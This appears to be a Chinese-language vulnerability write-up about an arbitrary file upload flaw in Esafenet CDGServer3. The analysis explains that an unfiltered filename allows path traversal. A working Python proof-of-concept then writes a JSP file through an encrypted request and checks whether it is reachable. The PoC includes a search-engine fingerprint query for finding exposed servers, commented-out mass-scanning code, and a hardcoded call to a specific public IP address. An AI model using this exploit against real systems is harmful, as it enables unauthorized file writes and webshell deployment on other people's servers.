# 漏洞分析

根据web.xml定位找到UploadFileFromClientServiceForClient所对应的类

![image-20230816144841496](images/1.png)

该类存在一个PUT和POST方法，PUT方法会调用POST方法

![image-20230816144856196](images/2.png)

首先会获取包含在 URL 中的查询字符串部分。查询字符串是在 HTTP 请求的 URL 中通过问号 ? 后面附加的一系列参数和值，用于将数据传递给服务器。然后进行解密

![image-20230816144931475](images/3.png)

是通过内部的加解密方式进行的

![image-20230816144943918](images/4.png)

通过&对解密后的字符串进行分割，放入一个数组绿盟，遍历数组匹配对不同参数进行赋值

然后创建一个UploadFileFromClientInfo并对相应参数进行设置

![image-20230816144957708](images/5.png)

获取POST的原始数据，创建FIle对象，因为filename的值没有进行过滤， 所以可以通过目录穿越符来实现对任意文件写入，接下来通过IO流操作写到将POST数据写到对应文件中

# 漏洞复现

使用亿赛通本身的代码对内容进行加密

![image-20230816145140801](images/6.png)

```
# (body="CDGServer3" && body!="DLP") || ((((title="电子文档安全管理系统" && (cert="esafenet" || body="CDGServer3")) || (body="CDGServer3/3g" && body="/help/getEditionInfo.jsp")) || body="CDGServer3/index.jsp") && title!="数据泄露")
import requests
import urllib3
import multiprocessing

urllib3.disable_warnings()

# proxies = {
#     "http": "http://127.0.0.1:7890",
#     "https": "http://127.0.0.1:7890"
# }
data = "hello Test"

def poc(url):
    target = url + "/CDGServer3/UploadFileFromClientServiceForClient?AFMALANMJCEOENIBDJMKFHBANGEPKHNOFJBMIFJPFNKFOKHJNMLCOIDDJGNEIPOLOKGAFAFJHDEJPHEPLFJHDGPBNELNFIICGFNGEOEFBKCDDCGJEPIKFHJFAOOHJEPNNCLFHDAFDNCGBAEELJFFHABJPDPIEEMIBOECDMDLEPBJGBGCGLEMBDFAGOGM"

    try:
        r = requests.post(target, data=data, verify=False)
        shell = url + "/tttT.jsp"
        if requests.get(shell).status_code == 200:
            with open("result.txt", "a") as f:
                f.write(shell + "\n")
                f.close()
            print(shell)
    except Exception as e:
        pass

if __name__ == "__main__":
    # with open("ip.txt") as file:
    #     urls = [line.strip("\n") for line in file]
    # with multiprocessing.Pool() as pool:
    #     pool.map(poc,urls)
    poc("http://117.107.159.130:8888")
```

![image-20230816145206688](images/1.png)

